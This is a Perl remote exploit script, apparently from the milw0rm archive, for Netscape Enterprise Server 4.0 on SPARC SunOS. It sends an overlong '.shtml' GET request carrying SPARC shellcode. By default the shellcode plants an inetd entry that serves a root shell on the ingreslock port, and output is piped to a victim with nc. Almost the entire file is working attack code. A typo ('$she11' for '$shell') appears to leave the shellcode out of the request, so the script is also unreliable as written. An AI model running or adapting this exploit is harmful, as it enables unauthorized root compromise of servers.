#!/usr/bin/perl

#
# Remote sploit for Netscape Enterprise Server 4.0/sparc/SunOS 5.7
# usage: ns-shtml.pl ['command line'] | nc victim port
#
# Sometimes server may hang or coredump.. eek ;-)
# fyodor@relaygroup.com

$cmdline="echo 'ingreslock stream tcp nowait root /bin/sh sh -i' > /tmp/bob; /usr/sbin/inetd -s /tmp/bob";
$cmdline=$ARGV[0] if $ARGV[0];


$nop='%80%1b%c0%1f';
$strlen=0x54 + length($cmdline);
$cmdline=~ s/ /%20/g; # encode bad characters..
$strlen=sprintf "%%%x", $strlen;

$shell=
'%20%bf%ff%ff' .#  start:	bn,a <start-4>			  ! super-dooper trick to get current address ;')
'%20%bf%ff%ff' .#  boom:	bn,a  <start>
'%7f%ff%ff%ff' .#  		call boom
'%90%03%e0%48' .#  		add %o7, binksh - boom, %o0       ! put binksh address into %o0
'%92%03%e0%38' .#  		add %o7, argz - boom, %o1         ! put address of argz array into %o1
'%a0%03%e0%51' .#  		add %o7, minusc - boom, %l0       ! put address of -c argument into %l0
'%a2%03%e0%54' .#  		add %o7, cmdline - boom, %l1      ! put address of command line argument into %l1
'%c0%2b%e0%50' .#  		stb %g0, [ %o7 + minusc-boom-1 ]  ! put ending zero byte at the end of /bin/sh
'%c0%2b%e0%53' .#		stb %g0, [ %o7 + cmdline-boom-1 ] ! put ending zero byte at the end of -c
'%c0%2b%e0' . $strlen .#        stb %g0, [ %o7 + endmark-boom-1 ] ! put ending zero byte at the end of command line
'%d0%23%e0%38' .#		st %o0, [ %o7 + argz-boom ]       ! store pointer to ksh into 0 element of argz
'%e0%23%e0%3c' .#		st %l0, [ %o7 + argz-boom+4 ]     ! store pointer to -c into 1 element of argz
'%e2%23%e0%40' .#		st %l1, [ %o7 + argz-boom+8 ]     ! store pointer to cmdline into 2 element of argz
'%c0%23%e0%44' .#		st %g0, [ %o7 + argz-boom+12 ]    ! store NULL pointer at the end
'%82%10%20%0b' .#		mov 0xb, %g1
'%91%d0%20%08' .#		ta 8
'%ff%ff%ff%ff'.  # 40	argz: 0xffffffff;
'%ff%ff%ff%ff'.   # 44	      0xffffffff;
'%ff%ff%ff%ff'.   # 48        0xffffffff;
'%ff%ff%ff%ff'.   # 52	      0xffffffff;
'/bin/kshA' .     # 56  binksh: "/bin/kshA";
'-cA' . $cmdline . 'A'; # cmdline: "blahblahA";

##################################################
# Generate huge GET /..<shellcode>...shtml here  #
##################################################
$padd=814-length($shell);
print STDERR "pad is $padd\n";

print "GET /";

print $nop x 40;
print $she11;
print "A"x $padd;

print "\xfd\xe7%dc\x80"; # %i0
print "AAAA"; # %i1
print "AAAA"; # %i2
print "AAAA"; # %i3
print "AAAA"; # %i4
print "AAAA"; # %i5
print '%fd%c3%16%58'; #%fp (%i6)
print '%ff%21%d7%ac'; # %i7
print "A"x1200;

print ".shtml HTTP/1.0\n\n";


# milw0rm.com [2001-01-27]
